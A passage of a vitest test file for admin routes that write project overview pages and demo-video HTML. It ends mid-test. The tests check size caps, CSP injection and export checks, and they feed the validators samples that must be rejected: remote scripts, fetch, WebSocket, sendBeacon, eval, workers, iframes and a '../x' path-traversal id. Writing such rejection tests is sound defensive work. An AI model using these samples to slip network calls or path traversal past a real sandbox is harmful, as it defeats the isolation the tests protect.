/**
 * projectHomeAdminRoutes.test.cjs — lib/feedback-remote/projectHomeAdminRoutes.cjs's two
 * routes (POST /admin/project-home/write and
 * POST /admin/project-home/demo-video/write, both {cwd, html}) and their
 * self-contained-HTML validators.
 *
 * Run: timeout 120 npx vitest run src/main/__tests__/projectHomeAdminRoutes.test.cjs
 */

'use strict';

import { test, expect, afterEach } from 'vitest';
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const config = require('../config.cjs');
const {
  registerAdminRoute,
  validateHomeHtml,
  validateDemoVideoHtml,
  injectCsp,
  maxVideoBytes,
  DEMO_VIDEO_CSP,
  MAX_HTML_BYTES,
  MAX_DEMO_VIDEO_BYTES,
  maxExportMp4Bytes,
  MAX_EXPORT_POSTER_BYTES,
} = require('../lib/feedback-remote/projectHomeAdminRoutes.cjs');
const { TIKTOK_CHECK_IDS } = require('../lib/demo-video-kit/checks.cjs');

const tmpDirs = [];
afterEach(async () => {
  while (tmpDirs.length) {
    const d = tmpDirs.pop();
    await fsp.rm(d, { recursive: true, force: true });
  }
});

async function mkProjectCwd() {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), 'sm-project-home-admin-'));
  config.addAllowedRoot(dir);
  fs.mkdirSync(path.join(dir, 'session-manager-operations'), { recursive: true });
  tmpDirs.push(dir);
  return dir;
}

/** Fake adminHttp stub: captures registered routes and invokes one directly. */
function makeFakeAdminHttp() {
  const routes = new Map();
  return {
    registerRoute(method, url, handler) {
      routes.set(`${method} ${url}`, handler);
    },
    async call(method, url, { rawBody, body } = {}) {
      const handler = routes.get(`${method} ${url}`);
      if (!handler) throw new Error(`no route registered for ${method} ${url}`);
      const text = rawBody !== undefined ? rawBody : body !== undefined ? JSON.stringify(body) : '';
      const chunks = text ? [Buffer.from(text)] : [];
      const req = {
        on(event, cb) {
          if (event === 'data') chunks.forEach((c) => cb(c));
          if (event === 'end') cb();
          return req;
        },
      };
      let status = null;
      let payload = null;
      const res = {
        writeHead(s) { status = s; },
        end(b) { payload = b ? JSON.parse(b) : null; },
      };
      await handler(req, res, new URLSearchParams());
      return { status, body: payload };
    },
    routes,
  };
}

const GOOD_HTML = '<!DOCTYPE html><html><head><style>body{background:url(data:image/png;base64,AAAA)}</style></head><body><script>1+1</script></body></html>';

const GOOD_DEMO_VIDEO_HTML = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="15"></head>'
  + '<body><canvas id="c"></canvas><script>window.smDemo = { scenes: [] }; const ctx = document.getElementById("c").getContext("2d"); ctx.fillRect(0,0,10,10);</script></body></html>';

test('registers the library routes, the aliases, the character route, the matrix routes and the review write route', () => {
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  expect([...adminHttp.routes.keys()].sort()).toEqual([
    'POST /admin/project-home/character/write',
    'POST /admin/project-home/demo-video/write',
    'POST /admin/project-home/matrix/read',
    'POST /admin/project-home/matrix/write',
    'POST /admin/project-home/pages/write',
    'POST /admin/project-home/videos/write',
    'POST /admin/project-home/videos/review/write',
    'POST /admin/project-home/videos/outcome/write',
    'POST /admin/project-home/write',
  ].sort());
});

const pagesRoot = (cwd) => path.join(fs.realpathSync(cwd), 'session-manager-operations', 'project-pages');

test('/write alias writes knowledge/overview/ (index.html + meta.json)', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: GOOD_HTML } });
  expect(status).toBe(200);
  expect(body.ok).toBe(true);
  const dir = path.join(pagesRoot(cwd), 'knowledge', 'overview');
  expect(body.path).toBe(path.join(dir, 'index.html'));
  expect(typeof body.bytes).toBe('number');
  expect(fs.readFileSync(body.path, 'utf8')).toBe(GOOD_HTML);
  expect(fs.readdirSync(dir).sort()).toEqual(['index.html', 'meta.json']);
  const meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));
  expect(meta).toMatchObject({ id: 'overview', title: 'Overview', topic: 'overview' });
  expect(Number.isNaN(Date.parse(meta.createdAt))).toBe(false);
});

test('a second /write replaces the overview page only', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  await adminHttp.call('POST', '/admin/project-home/pages/write', { body: { cwd, pageId: 'other', title: 'Other', html: '<p>keep</p>' } });
  await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: '<p>one</p>' } });
  await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: '<p>two</p>' } });
  const root = path.join(pagesRoot(cwd), 'knowledge');
  expect(fs.readFileSync(path.join(root, 'overview', 'index.html'), 'utf8')).toBe('<p>two</p>');
  expect(fs.readFileSync(path.join(root, 'other', 'index.html'), 'utf8')).toBe('<p>keep</p>');
  expect(fs.readdirSync(root).sort()).toEqual(['other', 'overview']);
});

test('pages/write writes knowledge/<pageId>/ and rejects bad ids, schema and remote refs', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/pages/write';
  const ok = await adminHttp.call('POST', route, { body: { cwd, pageId: 'arch-notes', title: 'Arch', topic: 't', html: GOOD_HTML } });
  expect(ok.status).toBe(200);
  const dir = path.join(pagesRoot(cwd), 'knowledge', 'arch-notes');
  expect(ok.body.path).toBe(path.join(dir, 'index.html'));
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'))).toMatchObject({ id: 'arch-notes', title: 'Arch', topic: 't' });
  for (const bad of [
    { pageId: '_character' },
    { pageId: 'Bad Id' },
    { pageId: '../x' },
    { title: '' },
    { extra: 1 },
    { html: '<script src="x.js"></script>' },
  ]) {
    const r = await adminHttp.call('POST', route, { body: { cwd, pageId: 'p1', title: 'T', html: '<p>x</p>', ...bad } });
    expect(r.status).toBe(400);
  }
  expect(fs.readdirSync(path.join(pagesRoot(cwd), 'knowledge')).sort()).toEqual(['arch-notes']);
});

test.each([
  ['empty', ''],
  ['whitespace only', '  \n '],
  ['script src', '<html><script src="app.js"></script></html>'],
  ['script src (remote, single quotes, attrs first)', "<script defer type='module' src='https://cdn.example.com/x.js'></script>"],
  ['link href http', '<link rel="stylesheet" href="https://fonts.googleapis.com/css">'],
  ['link href protocol-relative', '<link rel="stylesheet" href="//cdn.example.com/a.css">'],
  ['@import', '<style>@import url("https://x.com/a.css");</style>'],
  ['@import bare string', '<style>@import "a.css";</style>'],
  ['css url(http)', '<style>a{background:url(https://x.com/a.png)}</style>'],
  ['css url(quoted http)', "<style>a{background:url( 'http://x.com/a.png')}</style>"],
])('rejects %s with 400 and writes nothing', async (_label, html) => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.ok).toBe(false);
  expect(fs.existsSync(path.join(cwd, 'session-manager-operations', 'project-pages'))).toBe(false);
});

test('rejects html over 1MB', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = 'a'.repeat(MAX_HTML_BYTES + 1);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.error).toContain('limit');
});

test('a request body far beyond the cap is a clean 400, not a throw', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = 'a'.repeat(MAX_HTML_BYTES * 3);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.error).toContain('limit');
});

test('accepts an inline <link> to a local/data href and plain http text content', () => {
  expect(validateHomeHtml('<p>see https://example.com in prose</p>')).toBeNull();
  expect(validateHomeHtml('<link rel="icon" href="data:image/png;base64,AAAA">')).toBeNull();
});

test('validateHomeHtml exact 1MB is accepted, non-string rejected', () => {
  expect(validateHomeHtml('a'.repeat(MAX_HTML_BYTES))).toBeNull();
  expect(validateHomeHtml(undefined)).toMatch(/non-empty/);
});

test('bad JSON, missing/relative cwd, non-project cwd, and unknown keys are 400s', async () => {
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/write';
  expect((await adminHttp.call('POST', route, { rawBody: '{nope' })).status).toBe(400);
  expect((await adminHttp.call('POST', route, { body: { html: 'x' } })).status).toBe(400);
  expect((await adminHttp.call('POST', route, { body: { cwd: 'relative/dir', html: 'x' } })).status).toBe(400);
  expect((await adminHttp.call('POST', route, { body: { cwd: '/x', html: 'x', extra: 1 } })).status).toBe(400);

  const bare = await fsp.mkdtemp(path.join(os.tmpdir(), 'sm-project-home-bare-'));
  tmpDirs.push(bare);
  config.addAllowedRoot(bare);
  const res = await adminHttp.call('POST', route, { body: { cwd: bare, html: '<p>x</p>' } });
  expect(res.status).toBe(400);
  expect(res.body.error).toContain('not a Session Manager project');
});

// ───────────────────────────────── POST /admin/project-home/demo-video/write

const videoMeta = (over = {}) => ({
  style: 'plain',
  character: null,
  sources: [],
  report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: [] },
  macroVersion: 1,
  seedVersion: 1,
  model: 'm',
  effort: 'low',
  title: 'T',
  kind: 'project-demo',
  lengthS: 15,
  ...over,
});
const videoBody = (cwd, over = {}) => ({ cwd, videoId: 'my-vid', title: 'My video', kind: 'project-demo', lengthS: 15, html: GOOD_DEMO_VIDEO_HTML, meta: videoMeta(), ...over });
const durHtml = (n) => `<html><head><meta name="sm-demo-duration" content="${n}"></head><body>x</body></html>`;

test('demo-video alias adds a new videos/vid-*/ entry with CSP + bridge; two calls leave two entries; overview untouched', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  await adminHttp.call('POST', '/admin/project-home/write', { body: { cwd, html: GOOD_HTML } });

  const r1 = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html: GOOD_DEMO_VIDEO_HTML } });
  const r2 = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html: GOOD_DEMO_VIDEO_HTML } });
  expect(r1.status).toBe(200);
  expect(r1.body.ok).toBe(true);
  expect(typeof r1.body.path).toBe('string');
  expect(typeof r1.body.bytes).toBe('number');
  const vids = fs.readdirSync(path.join(pagesRoot(cwd), 'videos'));
  expect(vids).toHaveLength(2);
  for (const v of vids) expect(v).toMatch(/^vid-[a-z0-9]+$/);
  const dir = path.dirname(r1.body.path);
  expect(fs.readdirSync(dir).sort()).toEqual(['index.html', 'meta.json']);
  const meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));
  expect(meta).toMatchObject({ kind: 'project-demo', lengthS: 15, id: path.basename(dir) });
  expect(meta.report.bytes).toBe(r1.body.bytes);
  const written = fs.readFileSync(r1.body.path, 'utf8');
  expect(written.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
  expect(written).toContain('data-sm-player-bridge');
  expect(fs.readFileSync(path.join(pagesRoot(cwd), 'knowledge', 'overview', 'index.html'), 'utf8')).toBe(GOOD_HTML);
});

test('videos/write saves HTML with the CSP and the bridge, stamps id/createdAt/bytes, and replaces only that entry', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  const a = await adminHttp.call('POST', route, { body: videoBody(cwd) });
  expect(a.status).toBe(200);
  await adminHttp.call('POST', route, { body: videoBody(cwd, { videoId: 'other-vid' }) });
  const dir = path.join(pagesRoot(cwd), 'videos', 'my-vid');
  expect(a.body.path).toBe(path.join(dir, 'index.html'));
  const html = fs.readFileSync(a.body.path, 'utf8');
  expect(html.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
  expect(html).toContain('data-sm-player-bridge');
  expect(html.indexOf(DEMO_VIDEO_CSP)).toBeLessThan(html.indexOf('data-sm-player-bridge'));
  const meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));
  expect(meta).toMatchObject({ id: 'my-vid', title: 'My video', kind: 'project-demo', lengthS: 15 });
  expect(meta.report.bytes).toBe(Buffer.byteLength(html, 'utf8'));
  expect(Number.isNaN(Date.parse(meta.createdAt))).toBe(false);

  const again = await adminHttp.call('POST', route, { body: videoBody(cwd, { title: 'Renamed' }) });
  expect(again.status).toBe(200);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8')).title).toBe('Renamed');
  expect(fs.readdirSync(path.join(pagesRoot(cwd), 'videos')).sort()).toEqual(['my-vid', 'other-vid']);
});

const withAspectTag = (tag) => GOOD_DEMO_VIDEO_HTML.replace('<meta name="sm-demo-duration"', `${tag}<meta name="sm-demo-duration"`);
const readVideoMeta = (cwd, id = 'my-vid') => JSON.parse(fs.readFileSync(path.join(pagesRoot(cwd), 'videos', id, 'meta.json'), 'utf8'));

test.each([
  ['<meta name="sm-demo-aspect" content="9:16">', '9:16'],
  ["<meta content='9:16' name='SM-Demo-Aspect'>", '9:16'],
  ['<meta name="sm-demo-aspect" content="16:9">', '16:9'],
  ['', '16:9'],
])('videos/write reads the sm-demo-aspect tag %j into meta.aspect %s', async (tag, aspect) => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const r = await adminHttp.call('POST', '/admin/project-home/videos/write', { body: videoBody(cwd, { html: withAspectTag(tag) }) });
  expect(r.status).toBe(200);
  expect(r.body.meta.aspect).toBe(aspect);
  expect(readVideoMeta(cwd).aspect).toBe(aspect);
});

test('videos/write ignores a caller-supplied meta.aspect; the document tag is the one source', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const r = await adminHttp.call('POST', '/admin/project-home/videos/write', { body: videoBody(cwd, { meta: videoMeta({ aspect: '9:16' }) }) });
  expect(r.status).toBe(200);
  expect(r.body.meta.aspect).toBe('16:9');
  expect(readVideoMeta(cwd).aspect).toBe('16:9');
});

test('videos/write refuses an sm-demo-aspect content other than 16:9 or 9:16 with a 400 naming both', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const r = await adminHttp.call('POST', '/admin/project-home/videos/write', { body: videoBody(cwd, { html: withAspectTag('<meta name="sm-demo-aspect" content="4:3">') }) });
  expect(r.status).toBe(400);
  expect(r.body.ok).toBe(false);
  expect(r.body.error).toContain('16:9');
  expect(r.body.error).toContain('9:16');
  expect(fs.existsSync(path.join(pagesRoot(cwd), 'videos'))).toBe(false);
});

test("videos/write accepts kind 'episode' (a vertical series episode)", async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = withAspectTag('<meta name="sm-demo-aspect" content="9:16">');
  const r = await adminHttp.call('POST', '/admin/project-home/videos/write', { body: videoBody(cwd, { kind: 'episode', html, meta: videoMeta({ kind: 'episode' }) }) });
  expect(r.status).toBe(200);
  expect(readVideoMeta(cwd)).toMatchObject({ kind: 'episode', aspect: '9:16' });
});

test('projectVideoMeta still parses a stored meta.json without aspect', () => {
  const { schemas } = require('../ipcSchemas.cjs');
  const stored = {
    ...videoMeta(), id: 'old-vid', createdAt: '2026-11-01T00:00:00.000Z',
    report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: [], bytes: 10 },
  };
  const parsed = schemas.projectVideoMeta.parse(stored);
  expect(parsed.aspect).toBeUndefined();
  expect(schemas.projectVideoMeta.safeParse({ ...stored, aspect: '4:3' }).success).toBe(false);
});

// ─────────────────────────────── videos/write: tiktok / marketing exports

const MP4_BYTES = Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from('ftypisom'), Buffer.alloc(16, 1)]);
const PNG_BYTES = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(16, 2)]);
const goodExports = () => ({ mp4Base64: MP4_BYTES.toString('base64'), posterBase64: PNG_BYTES.toString('base64') });
const tiktokChecks = () => TIKTOK_CHECK_IDS.map((id) => ({ id, ok: true, detail: '' }));
const VERTICAL_HTML = withAspectTag('<meta name="sm-demo-aspect" content="9:16">');
const tiktokBody = (cwd, over = {}, metaOver = {}) => videoBody(cwd, {
  kind: 'tiktok',
  html: VERTICAL_HTML,
  exports: goodExports(),
  meta: videoMeta({
    kind: 'tiktok',
    post: { caption: 'Would you ship this today? #devtools', audience: 'solo developers' },
    report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: tiktokChecks() },
    ...metaOver,
  }),
  ...over,
});
const marketingBody = (cwd, over = {}) => videoBody(cwd, { kind: 'marketing', exports: goodExports(), meta: videoMeta({ kind: 'marketing' }), ...over });
const VIDEOS_ROUTE = '/admin/project-home/videos/write';

test('videos/write saves a tiktok video: video.mp4 + poster.png beside index.html and meta.json', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const r = await adminHttp.call('POST', VIDEOS_ROUTE, { body: tiktokBody(cwd) });
  expect(r.status).toBe(200);
  const dir = path.join(pagesRoot(cwd), 'videos', 'my-vid');
  expect(fs.readdirSync(dir).sort()).toEqual(['index.html', 'meta.json', 'poster.png', 'video.mp4']);
  expect(fs.readFileSync(path.join(dir, 'video.mp4')).equals(MP4_BYTES)).toBe(true);
  expect(fs.readFileSync(path.join(dir, 'poster.png')).equals(PNG_BYTES)).toBe(true);
  const meta = readVideoMeta(cwd);
  expect(meta).toMatchObject({ kind: 'tiktok', aspect: '9:16', post: { caption: 'Would you ship this today? #devtools' } });
  expect(meta.exports).toBeUndefined();
});

test('videos/write saves a marketing video with its exports', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const r = await adminHttp.call('POST', VIDEOS_ROUTE, { body: marketingBody(cwd) });
  expect(r.status).toBe(200);
  expect(fs.readdirSync(path.join(pagesRoot(cwd), 'videos', 'my-vid')).sort()).toEqual(['index.html', 'meta.json', 'poster.png', 'video.mp4']);
});

test('videos/write: other kinds ignore exports and write only index.html + meta.json', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const withExp = await adminHttp.call('POST', VIDEOS_ROUTE, { body: videoBody(cwd, { exports: goodExports() }) });
  expect(withExp.status).toBe(200);
  const bad = await adminHttp.call('POST', VIDEOS_ROUTE, { body: videoBody(cwd, { videoId: 'v2', exports: { mp4Base64: 'AAAA', posterBase64: 'AAAA' } }) });
  expect(bad.status).toBe(200);
  for (const id of ['my-vid', 'v2']) {
    expect(fs.readdirSync(path.join(pagesRoot(cwd), 'videos', id)).sort()).toEqual(['index.html', 'meta.json']);
  }
});

const MiB = 1024 * 1024;
const notMp4 = Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from('moovisom'), Buffer.alloc(16)]);
const notPng = Buffer.from('GIF89a-not-a-png-at-all');
const oversizedMp4 = () => {
  const b = Buffer.alloc(maxExportMp4Bytes(15) + 1);
  MP4_BYTES.copy(b);
  return b.toString('base64');
};
const oversizedPng = () => {
  const b = Buffer.alloc(MAX_EXPORT_POSTER_BYTES + 1);
  PNG_BYTES.copy(b);
  return b.toString('base64');
};

test('export caps: 24 MiB per started 30 s for the MP4, 4 MiB for the poster', () => {
  expect(maxExportMp4Bytes(15)).toBe(24 * MiB);
  expect(maxExportMp4Bytes(30)).toBe(24 * MiB);
  expect(maxExportMp4Bytes(31)).toBe(48 * MiB);
  expect(maxExportMp4Bytes(60)).toBe(48 * MiB);
  expect(MAX_EXPORT_POSTER_BYTES).toBe(4 * MiB);
});

test.each([
  ['tiktok without exports', (cwd) => tiktokBody(cwd, { exports: undefined }), /requires exports\.mp4Base64 and exports\.posterBase64/],
  ['marketing without exports', (cwd) => marketingBody(cwd, { exports: undefined }), /requires exports\.mp4Base64 and exports\.posterBase64/],
  ['an MP4 without ftyp', (cwd) => tiktokBody(cwd, { exports: { ...goodExports(), mp4Base64: notMp4.toString('base64') } }), /'ftyp' at bytes 4-7/],
  ['a poster without the PNG signature', (cwd) => tiktokBody(cwd, { exports: { ...goodExports(), posterBase64: notPng.toString('base64') } }), /PNG signature/],
  ['an MP4 over its cap', (cwd) => tiktokBody(cwd, { exports: { ...goodExports(), mp4Base64: oversizedMp4() } }), new RegExp(`mp4Base64 exceeds the ${24 * MiB}-byte limit`)],
  ['a poster over 4 MiB', (cwd) => tiktokBody(cwd, { exports: { ...goodExports(), posterBase64: oversizedPng() } }), new RegExp(`posterBase64 exceeds the ${4 * MiB}-byte limit`)],
  ['non-base64 exports', (cwd) => tiktokBody(cwd, { exports: { ...goodExports(), mp4Base64: '!!!!' } }), /not valid base64/],
  ['tiktok at 16:9', (cwd) => tiktokBody(cwd, { html: GOOD_DEMO_VIDEO_HTML }), /kind 'tiktok' requires aspect '9:16'/],
  ['marketing at 9:16', (cwd) => marketingBody(cwd, { html: VERTICAL_HTML }), /kind 'marketing' requires aspect '16:9'/],
  ['tiktok without meta.post', (cwd) => tiktokBody(cwd, {}, { post: undefined }), /requires meta\.post/],
  ['tiktok with a failing post caption', (cwd) => tiktokBody(cwd, {}, { post: { caption: 'No question here #a', audience: 'devs' } }), /post caption check failed/],
  ['tiktok missing a TikTok check', (cwd) => tiktokBody(cwd, {}, {
    report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: tiktokChecks().filter((c) => c.id !== 'tiktok-loop') },
  }), /every TikTok check.*tiktok-loop/],
  ['tiktok with a failed TikTok check', (cwd) => tiktokBody(cwd, {}, {
    report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: tiktokChecks().map((c) => (c.id === 'tiktok-hook' ? { ...c, ok: false } : c)) },
  }), /tiktok-hook/],
])('videos/write refuses %s with a 400 naming the rule and writes nothing', async (_label, body, reason) => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const r = await adminHttp.call('POST', VIDEOS_ROUTE, { body: body(cwd) });
  expect(r.status).toBe(400);
  expect(r.body.ok).toBe(false);
  expect(r.body.error).toMatch(reason);
  expect(fs.existsSync(path.join(pagesRoot(cwd), 'videos'))).toBe(false);
});

test('videos/write rejects schema errors, bad ids, duration mismatch and network APIs with 400', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  for (const over of [
    { videoId: '_character' },
    { videoId: 'Bad' },
    { kind: 'nope' },
    { lengthS: 4 },
    { lengthS: 61 },
    { extra: 1 },
    { lengthS: 20 }, // html declares 15
    { html: GOOD_DEMO_VIDEO_HTML.replace('ctx.fillRect', 'fetch("/x");ctx.fillRect') },
  ]) {
    const r = await adminHttp.call('POST', route, { body: videoBody(cwd, over) });
    expect(r.status).toBe(400);
    expect(r.body.ok).toBe(false);
  }
  expect(fs.existsSync(path.join(pagesRoot(cwd), 'videos'))).toBe(false);
});

test('videos/write re-runs kit checks: htmlLimits and failed report.checks refuse with 400 naming the check', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  const noScenes = GOOD_DEMO_VIDEO_HTML.replace('window.smDemo = { scenes: [] };', '');
  const r1 = await adminHttp.call('POST', route, { body: videoBody(cwd, { html: noScenes }) });
  expect(r1.status).toBe(400);
  expect(JSON.stringify(r1.body)).toContain('htmlLimits');
  const bad = videoMeta({ report: { lufs: null, truePeakDb: null, speechS: null, readingGrade: null, checks: [{ id: 'captions', ok: true, detail: '' }, { id: 'blankFrames', ok: false, detail: 'blank' }] } });
  const r2 = await adminHttp.call('POST', route, { body: videoBody(cwd, { meta: bad }) });
  expect(r2.status).toBe(400);
  expect(JSON.stringify(r2.body)).toContain('blankFrames');
  expect(fs.existsSync(path.join(pagesRoot(cwd), 'videos'))).toBe(false);
});

test('demo-video alias is exempt from the kit checks (no smDemo, no report)', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = GOOD_DEMO_VIDEO_HTML.replace('window.smDemo = { scenes: [] };', '');
  const r = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html } });
  expect(r.status).toBe(200);
});

test('video size cap scales with length: 4 MiB at 60 s, 2 MiB at 30 s', async () => {
  expect(maxVideoBytes(30)).toBe(2 * 1024 * 1024);
  expect(maxVideoBytes(60)).toBe(4 * 1024 * 1024);
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const route = '/admin/project-home/videos/write';
  const pad = (n, len) => durHtml(n).replace('x</body>', `<script>window.smDemo={scenes:[]}</script><!--${'a'.repeat(len)}--></body>`);
  const big = pad(60, 3 * 1024 * 1024);
  const ok = await adminHttp.call('POST', route, { body: videoBody(cwd, { lengthS: 60, html: big }) });
  expect(ok.status).toBe(200);
  const tooBig30 = await adminHttp.call('POST', route, { body: videoBody(cwd, { videoId: 'v30', lengthS: 30, html: pad(30, 3 * 1024 * 1024) }) });
  expect(tooBig30.status).toBe(400);
  expect(tooBig30.body.error).toMatch(/limit|cap/);
  const tooBig60 = await adminHttp.call('POST', route, { body: videoBody(cwd, { videoId: 'v60', lengthS: 60, html: pad(60, 4 * 1024 * 1024) }) });
  expect(tooBig60.status).toBe(400);
  expect(tooBig60.body.error).toMatch(/limit|cap/);
});

test('injectCsp always puts the CSP meta first after a fresh doctype, replacing any existing CSP meta and leading doctype', () => {
  const noDoctype = injectCsp('<html><body>x</body></html>');
  expect(noDoctype).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><body>x</body></html>`);

  const existingCsp = '<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"><title>t</title></head><body>x</body></html>';
  const replaced = injectCsp(existingCsp);
  expect(replaced).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><head><title>t</title></head><body>x</body></html>`);

  const withDoctype = injectCsp('<!DOCTYPE html><html><head><title>t</title></head><body>x</body></html>');
  expect(withDoctype).toBe(`<!DOCTYPE html>${DEMO_VIDEO_CSP}<html><head><title>t</title></head><body>x</body></html>`);
});

test.each([
  ['empty', ''],
  ['whitespace only', '  \n '],
  ['script src (remote)', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script src="https://cdn.example.com/x.js"></script></body></html>`],
  ['fetch(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>fetch('/x')</script></body></html>`],
  ['XMLHttpRequest', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new XMLHttpRequest()</script></body></html>`],
  ['WebSocket', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new WebSocket('wss://x')</script></body></html>`],
  ['EventSource', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new EventSource('/x')</script></body></html>`],
  ['sendBeacon', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>navigator.sendBeacon('/x')</script></body></html>`],
  ['dynamic import(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>import('/x.js')</script></body></html>`],
  ['importScripts', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>importScripts('/x.js')</script></body></html>`],
  ['<iframe', `<html><head><meta name="sm-demo-duration" content="10"></head><body><iframe src="data:text/html,x"></iframe></body></html>`],
  ['<object', `<html><head><meta name="sm-demo-duration" content="10"></head><body><object data="x"></object></body></html>`],
  ['<embed', `<html><head><meta name="sm-demo-duration" content="10"></head><body><embed src="x"></body></html>`],
  ['window.open', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>window.open('/x')</script></body></html>`],
  ['href= http', `<html><head><meta name="sm-demo-duration" content="10"></head><body><a href="https://example.com">x</a></body></html>`],
  ['src= protocol-relative', `<html><head><meta name="sm-demo-duration" content="10"></head><body><img src="//example.com/a.png"></body></html>`],
  ['missing duration meta', '<html><head></head><body><p>x</p></body></html>'],
  ['duration 61 (above range)', '<html><head><meta name="sm-demo-duration" content="61"></head><body><p>x</p></body></html>'],
  ['duration 4 (below range)', '<html><head><meta name="sm-demo-duration" content="4"></head><body><p>x</p></body></html>'],
  ['computed window["fetch"] access', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>window["fetch"]("/x")</script></body></html>`],
  ['Worker(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new Worker("x.js")</script></body></html>`],
  ['SharedWorker', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new SharedWorker("x.js")</script></body></html>`],
  ['serviceWorker', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>navigator.serviceWorker.register("x.js")</script></body></html>`],
  ['rel=preload', `<html><head><meta name="sm-demo-duration" content="10"></head><body><link rel="preload" href="x.png"></body></html>`],
  ['eval(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>eval("1+1")</script></body></html>`],
  ['Function(', `<html><head><meta name="sm-demo-duration" content="10"></head><body><script>new Function("return 1")()</script></body></html>`],
  ['<base', `<html><head><meta name="sm-demo-duration" content="10"><base href="/"></head><body>x</body></html>`],
  ['<form', `<html><head><meta name="sm-demo-duration" content="10"></head><body><form></form></body></html>`],
])('rejects %s with 400 and writes nothing', async (_label, html) => {
  const cwd = await mkProjectCwd();
